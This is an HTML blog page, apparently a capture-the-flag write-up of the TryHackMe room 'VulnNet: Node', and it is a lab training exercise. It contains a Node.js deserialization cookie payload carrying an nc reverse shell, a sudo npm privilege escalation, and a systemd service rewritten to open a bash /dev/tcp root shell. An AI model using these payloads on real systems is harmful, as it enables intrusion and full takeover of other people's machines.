@@ -1,0 +1,418 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>TryHackMe - VulnNet: Node | geobour98</title>
+<meta name=keywords content="linux,web,base64,deserialization,node.js,sudo,npm,systemctl,service">
+<meta name=description content="Introduction This is a TryHackMe room which can be found at: VulnNet: Node
+After the previous breach, VulnNet Entertainment states it won&rsquo;t happen again. Can you prove they&rsquo;re wrong?
+Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
+ Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.">
+<meta name=author content="geobour98">
+<link rel=canonical href=https://geobour98.github.io/write-ups/vulnnetnode/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://geobour98.github.io/logo.png>
+<link rel=icon type=image/png sizes=16x16 href=https://geobour98.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://geobour98.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://geobour98.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://geobour98.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2SY6CF9Q6K"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-2SY6CF9Q6K',{anonymize_ip:!1})}</script>
+<meta property="og:title" content="TryHackMe - VulnNet: Node">
+<meta property="og:description" content="Introduction This is a TryHackMe room which can be found at: VulnNet: Node
+After the previous breach, VulnNet Entertainment states it won&rsquo;t happen again. Can you prove they&rsquo;re wrong?
+Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
+ Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://geobour98.github.io/write-ups/vulnnetnode/"><meta property="og:image" content="https://geobour98.github.io/47"><meta property="article:section" content="write-ups">
+<meta property="article:published_time" content="2022-09-10T00:00:00+00:00">
+<meta property="article:modified_time" content="2022-09-10T00:00:00+00:00"><meta property="og:site_name" content="geobour98">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://geobour98.github.io/47">
+<meta name=twitter:title content="TryHackMe - VulnNet: Node">
+<meta name=twitter:description content="Introduction This is a TryHackMe room which can be found at: VulnNet: Node
+After the previous breach, VulnNet Entertainment states it won&rsquo;t happen again. Can you prove they&rsquo;re wrong?
+Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
+ Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.github.io/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - VulnNet: Node","item":"https://geobour98.github.io/write-ups/vulnnetnode/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - VulnNet: Node","name":"TryHackMe - VulnNet: Node","description":"Introduction This is a TryHackMe room which can be found at: VulnNet: Node\nAfter the previous breach, VulnNet Entertainment states it won\u0026rsquo;t happen again. Can you prove they\u0026rsquo;re wrong?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.","keywords":["linux","web","base64","deserialization","node.js","sudo","npm","systemctl","service"],"articleBody":"Introduction This is a TryHackMe room which can be found at: VulnNet: Node\nAfter the previous breach, VulnNet Entertainment states it won’t happen again. Can you prove they’re wrong?\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.10.213.208 [2 ports] Completed Ping Scan at 10:44, 0.07s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 10:44 Completed Parallel DNS resolution of 1 host. at 10:44, 0.00s elapsed Initiating Connect Scan at 10:44 Scanning 10.10.213.208 (10.10.213.208) [65535 ports] Discovered open port 8080/tcp on 10.10.213.208 Completed Connect Scan at 10:45, 60.48s elapsed (65535 total ports) Nmap scan report for 10.10.213.208 (10.10.213.208) Host is up (0.070s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE 8080/tcp open http-proxy Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 60.59 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n Command: sudo nmap -A -sC -p 8080 -v 10.10.213.208  geobour98@kali:~$ sudo nmap -A -sC -p 8080 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:46 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating Ping Scan at 10:46 Scanning 10.10.213.208 [4 ports] Completed Ping Scan at 10:46, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 10:46 Completed Parallel DNS resolution of 1 host. at 10:46, 0.01s elapsed Initiating SYN Stealth Scan at 10:46 Scanning 10.10.213.208 (10.10.213.208) [1 port] Discovered open port 8080/tcp on 10.10.213.208 Completed SYN Stealth Scan at 10:46, 0.11s elapsed (1 total ports) Initiating Service scan at 10:46 Scanning 1 service on 10.10.213.208 (10.10.213.208) Completed Service scan at 10:46, 7.89s elapsed (1 service on 1 host) Initiating OS detection (try #1) against 10.10.213.208 (10.10.213.208) Retrying OS detection (try #2) against 10.10.213.208 (10.10.213.208) Initiating Traceroute at 10:46 Completed Traceroute at 10:46, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 10:46 Completed Parallel DNS resolution of 1 host. at 10:46, 0.00s elapsed NSE: Script scanning 10.10.213.208. Initiating NSE at 10:46 Completed NSE at 10:46, 11.65s elapsed Initiating NSE at 10:46 Completed NSE at 10:47, 2.20s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Nmap scan report for 10.10.213.208 (10.10.213.208) Host is up (0.072s latency). PORT STATE SERVICE VERSION 8080/tcp open http Node.js Express framework | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: VulnNet \u0026ndash; Your reliable news source \u0026ndash; Try Now! Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 33.159 days (since Tue Aug 2 06:58:11 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 68.75 ms 10.8.0.1 (10.8.0.1) 2 68.81 ms 10.10.213.208 (10.10.213.208) NSE: Script Post-scanning. Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds Raw packets sent: 59 (4.152KB) | Rcvd: 40 (3.012KB) Navigate to port 8080, click LOGIN NOW, put in the Email field of the login form test@test.com and in the password field test, open Burp Suite and Intercept the request. Then send it to Repeater. The request should look like this:\nGET /login? HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D Upgrade-Insecure-Requests: 1 In the Cookie header of the request if we decode the session value from base64 we identify a serialized object.\n Command: echo -n \"eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D\" | base64 -d  geobour98@kali:~$ echo -n \"eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D\" | base64 -d {\"username\":\"Guest\",\"isGuest\":true,\"encoding\": \"utf-8\"} Then, we can send another request modifying the value of the cookie to identify any errors. The request should look like this:\nGET / HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Ik Upgrade-Insecure-Requests: 1 The response containing information about unserialize function of Node.js is the following:\nHTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Security-Policy: default-src 'none' X-Content-Type-Options: nosniff Content-Type: text/html; charset=utf-8 Content-Length: 1160 Date: Sun, 04 Sep 2022 08:08:19 GMT Connection: close =\"en\"  =\"utf-8\" Error   SyntaxError: Unexpected end of JSON input\n\u0026nbsp; \u0026nbsp;at JSON.parse (\u0026lt;anonymous\u0026gt;)\n\u0026nbsp; \u0026nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)\n\u0026nbsp; \u0026nbsp;at /home/www/VulnNet-Node/server.js:16:24\n\u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)\n\u0026nbsp; \u0026nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)\n\u0026nbsp; \u0026nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)\n\u0026nbsp; \u0026nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)\n\u0026nbsp; \u0026nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22\n\u0026nbsp; \u0026nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)\n\u0026nbsp; \u0026nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)   Exploitation We can create a serialized object that contains a reverse shell, base64 encode it and then URL encode any special characters. The serialized object should look like this:\n{\"username\":\"_$$ND_FUNC$$_function (){require('child_process').exec(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc 10.8.200.50 443 /tmp/f\\\", function(error, stdout, stderr) { console.log(stdout) });}()\"} Go in Decoder in Burp Suite and put the serialized object. Then click on Encode as and select Base64 so the output should look like this:\neyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Before putting the base64 encoded value in the Cookie, URL encode any special characters. In my case, only the + should become %2b. The final request in order to get reverse shell should look like this:\nGET / HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA%2bL3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Upgrade-Insecure-Requests: 1 Open a netcat listener and click Send on the Repeater tab and we get a reverse shell as www\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 58244 /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www@vulnnet-node:~/VulnNet-Node$ ^Z zsh: suspended nc -lvnp 443 geobour98@kali:~$ stty raw -echo;fg 1] + continued nc -lvnp 443 www@vulnnet-node:~/VulnNet-Node$ www@vulnnet-node:~/VulnNet-Node$ export TERM=xterm-256color www@vulnnet-node:~/VulnNet-Node$ stty rows 38 cols 111 www@vulnnet-node:~/VulnNet-Node$ whoami www www@vulnnet-node:~/VulnNet-Node$ id uid=1001(www) gid=1001(www) groups=1001(www) The server performed deserialization of the Cookie header so the reverse shell was executed. The payload used can be found in this great article: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/, which is about Node.js deserialization as in our case.\nPrivilege Escalation After executing the command: sudo -l we see that we can execute npm as serv-manage without being asked for password.\nwww@vulnnet-node:~/VulnNet-Node$ sudo -l Matching Defaults entries for www on vulnnet-node: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www may run the following commands on vulnnet-node: (serv-manage) NOPASSWD: /usr/bin/npm A great exploit for this can be found on: https://gtfobins.github.io/gtfobins/npm/#sudo\nwww@vulnnet-node:~/VulnNet-Node$ cd /dev/shm www@vulnnet-node:/dev/shm$ echo '{\"scripts\": {\"preinstall\": \"/bin/bash\"}}'  /dev/shm/package.json www@vulnnet-node:/dev/shm$ sudo -u serv-manage npm -C /dev/shm/ --unsafe-perm i  @ preinstall /dev/shm  /bin/bash serv-manage@vulnnet-node:/dev/shm$ cd /home/serv-manage serv-manage@vulnnet-node:~$ id uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage) serv-manage@vulnnet-node:~$ cat user.txt THM{[REDACTED]} Now we are the user serv-manage. We execute sudo -l and we see that we can start/stop the following systemd timers and reload the systemd manager configuration as root.\nserv-manage@vulnnet-node:~$ sudo -l Matching Defaults entries for serv-manage on vulnnet-node: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User serv-manage may run the following commands on vulnnet-node: (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer (root) NOPASSWD: /bin/systemctl daemon-reload Find where vulnnet-auto.timer is located and open that file.\nserv-manage@vulnnet-node:~$ locate vulnnet-auto.timer /etc/systemd/system/vulnnet-auto.timer serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer [Unit] Description=Run VulnNet utilities every 30 min [Timer] OnBootSec=0min # 30 min job OnCalendar=*:0/30 Unit=vulnnet-job.service [Install] WantedBy=basic.target We see that vulnnet-job.service is called so we find where this service is located and open it.\nserv-manage@vulnnet-node:~$ locate vulnnet-job.service /etc/systemd/system/vulnnet-job.service serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service [Unit] Description=Logs system statistics to the systemd journal Wants=vulnnet-auto.timer [Service] # Gather system statistics Type=forking ExecStart=/bin/df [Install] WantedBy=multi-user.target First, stop the timer with systemctl, then modify vulnnet-job.service in order to get reverse shell as root, reload the configuration and start the timer again with systemctl.\nserv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service [Unit] Description=Logs system statistics to the systemd journal Wants=vulnnet-auto.timer [Service] # Gather system statistics Type=forking ExecStart=/bin/bash -c 'bash -i \u0026 /dev/tcp/10.8.200.50/444 0\u00261' [Install] WantedBy=multi-user.target serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer Open another netcat listener on 444 port and we get root reverse shell.\ngeobour98@kali:~$ nc -lvnp 444 listening on [any] 444 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 55696 bash: cannot set terminal process group (1119): Inappropriate ioctl for device bash: no job control in this shell root@vulnnet-node:/# cd /root root@vulnnet-node:/root# id uid=0(root) gid=0(root) groups=0(root) root@vulnnet-node:/root# cat root.txt THM{[REDACTED]} Proof of Concept (PoC image): ","wordCount":"1527","inLanguage":"en","datePublished":"2022-09-10T00:00:00Z","dateModified":"2022-09-10T00:00:00Z","author":{"@type":"Person","name":"geobour98"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.github.io/write-ups/vulnnetnode/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.github.io/logo.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://geobour98.github.io/ accesskey=h title="geobour98 (Alt + H)">
+<img src=https://geobour98.github.io/logo.png alt aria-label=logo height=35>geobour98</a>
+<div class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</div>
+</div>
+<ul id=menu>
+<li>
+<a href=https://geobour98.github.io/about/ title=About>
+<span>About</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/blog/ title=Blog>
+<span>Blog</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/write-ups/ title=Write-ups>
+<span>Write-ups</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://geobour98.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<h1 class=post-title>
+TryHackMe - VulnNet: Node
+</h1>
+<div class=post-meta><span title="2022-09-10 00:00:00 +0000 UTC">September 10, 2022</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;geobour98
+</div>
+</header>
+<div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
+<p>This is a <strong>TryHackMe</strong> room which can be found at: <a href=https://tryhackme.com/room/vulnnetnode target=_blank style=color:#e30f0f>VulnNet: Node</a></p>
+<p>After the previous breach, VulnNet Entertainment states it won&rsquo;t happen again. Can you prove they&rsquo;re wrong?</p>
+<h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2>
+<p>Perform <code>nmap</code> scan to identify open ports and services.</p>
+<ul>
+<li>Command: <code>nmap -p- -T4 -v 10.10.213.208</code></li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-04 10:44 EEST
+Initiating Ping Scan at 10:44
+Scanning 10.10.213.208 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
+Completed Ping Scan at 10:44, 0.07s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
+Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:44
+Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:44, 0.00s elapsed
+Initiating Connect Scan at 10:44
+Scanning 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
+Discovered open port 8080/tcp on 10.10.213.208
+Completed Connect Scan at 10:45, 60.48s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.070s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>65534</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 60.59 seconds
+</code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p>
+<ul>
+<li>Command: <code>sudo nmap -A -sC -p 8080 -v 10.10.213.208</code></li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@kali:~$ sudo nmap -A -sC -p <span style=color:#ae81ff>8080</span> -v 10.10.213.208
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-09-04 10:46 EEST
+NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:46
+Completed NSE at 10:46, 0.00s elapsed
+Initiating NSE at 10:46
+Completed NSE at 10:46, 0.00s elapsed
+Initiating NSE at 10:46
+Completed NSE at 10:46, 0.00s elapsed
+Initiating Ping Scan at 10:46
+Scanning 10.10.213.208 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
+Completed Ping Scan at 10:46, 0.13s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
+Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:46
+Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:46, 0.01s elapsed
+Initiating SYN Stealth Scan at 10:46
+Scanning 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> port<span style=color:#f92672>]</span>
+Discovered open port 8080/tcp on 10.10.213.208
+Completed SYN Stealth Scan at 10:46, 0.11s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total ports<span style=color:#f92672>)</span>
+Initiating Service scan at 10:46
+Scanning <span style=color:#ae81ff>1</span> service on 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span>
+Completed Service scan at 10:46, 7.89s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> service on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
+Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.213.208 (10.10.213.208)</span>
+Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.213.208 (10.10.213.208)</span>
+Initiating Traceroute at 10:46
+Completed Traceroute at 10:46, 0.07s elapsed
+Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:46
+Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 10:46, 0.00s elapsed
+NSE: Script scanning 10.10.213.208.
+Initiating NSE at 10:46
+Completed NSE at 10:46, 11.65s elapsed
+Initiating NSE at 10:46
+Completed NSE at 10:47, 2.20s elapsed
+Initiating NSE at 10:47
+Completed NSE at 10:47, 0.00s elapsed
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span>
+Host is up <span style=color:#f92672>(</span>0.072s latency<span style=color:#f92672>)</span>.
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now!
+Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
